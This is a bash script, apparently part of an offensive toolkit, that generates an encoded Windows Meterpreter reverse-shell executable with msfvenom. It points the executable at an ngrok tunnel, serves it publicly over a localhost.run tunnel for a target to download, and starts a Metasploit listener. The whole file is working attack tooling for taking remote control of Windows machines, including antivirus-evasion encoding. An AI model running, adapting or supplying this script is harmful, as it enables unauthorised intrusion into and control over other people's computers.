#!/bin/bash

ngrokhost=`cat logs/ngrok.log | grep "tcp://" | awk '{print $8}' | grep -Eo '[0-9].[a-z].[a-z].[a-z]*.[a-z]*.[a-z]*'`
ngrokport=`cat logs/ngrok.log | grep "tcp://" | awk '{print $8}' | grep -Eo '[tcp://].*' | awk -F: '{print $3}'`

# Creating payload
echo "\033[32m[INFO]\033[37m Creating payload..."
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ngrokhost LPORT=$ngrokport --platform windows -a x86 -e x86/shikata_ga_nai -f exe > bash-bunny.exe 2>/dev/null > /dev/null

if [ $? -eq 0 ]; then
    echo "\033[32m[INFO]\033[37m Payload created successfully"
    if [ -f "config/meterpreter.rc" ] || [ ! -f "config/meterpreter.rc" ]; then
        echo "\033[32m[INFO]\033[37m Updating meterpreter.rc configuration file..."
        rm config/meterpreter.rc > /dev/null 2>&1
        touch config/meterpreter.rc
        echo use exploit/multi/handler >> config/meterpreter.rc
        echo set PAYLOAD windows/meterpreter/reverse_tcp >> config/meterpreter.rc
        echo set LHOST 0.0.0.0 >> config/meterpreter.rc
        echo set LPORT $port >> config/meterpreter.rc
        echo exploit >> config/meterpreter.rc
        echo "\033[32m[INFO]\033[37m Tunnelizing connections"
        nohup ssh -R 80:localhost:80 localhost.run > logs/ssh.log 2>/dev/null &
        # Open localhost through port 80 for download since target side the malicious file
        echo "\033[32m[INFO]\033[37m Opening server over internet"
        x-terminal-emulator -e "python3 -m http.server 80" 2>/dev/null &
        echo "[\033[32m[INFO]\033[37m OK... Activating listener"
        # Execute msfconsole
        x-terminal-emulator -e "msfconsole -r config/meterpreter.rc -q" 2>/dev/null &
        if [[ $? -eq 1 ]]; then
            echo -e "\033[31m[ERROR]\033[37m Something went wrong executing the launcher"
        fi
    else
        echo -e "\033[31m[ERROR]\033[37m Something went wrong creating the file"
    fi
else
    echo -e "\033[31m[ERROR]\033[37m Something went wrong while creating the payload"
fi